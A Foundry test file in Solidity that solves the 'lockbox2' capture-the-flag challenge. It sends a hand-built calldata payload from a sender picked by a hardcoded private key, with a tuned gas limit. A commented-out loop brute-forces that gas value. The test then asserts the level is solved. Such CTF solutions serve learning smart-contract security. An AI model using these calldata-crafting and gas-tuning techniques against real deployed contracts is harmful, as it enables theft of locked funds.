pragma solidity >=0.5.0;

import "forge-std/Test.sol";
import "../../src/07.lockbox2/Setup.sol";

contract lockbox2Test is Test{

    Setup level;
    Lockbox2 lockbox2;

    function setUp() public {
        level = new Setup();
        lockbox2 = level.lockbox2();
    }

    // function test_isSolved() public{
    //     console.log(lockbox2.locked());
    //     // 用私钥选择msg.sender
    //     vm.startBroadcast(53696799650805905702178748833560284763518490362681353450771033938641345485772);
    //     for(uint i = 200000; i <= 315585;i++){
    //         address(lockbox2).call{gas:i}(hex"890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");

    //         if(lockbox2.locked()== false){
    //             emit log_uint(i);
    //             break;
    //         }

    //     }
    //     console.log(lockbox2.locked());
    //     vm.stopBroadcast();
    // }

    function test_isSolved() public{
        console.log(lockbox2.locked());
        // 用私钥选择msg.sender
        vm.startBroadcast(53696799650805905702178748833560284763518490362681353450771033938641345485772);
        
        address(lockbox2).call{gas:289126}(hex"890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
        console.log(lockbox2.locked());
        vm.stopBroadcast();
        assertEq(level.isSolved(),true);
    }


}

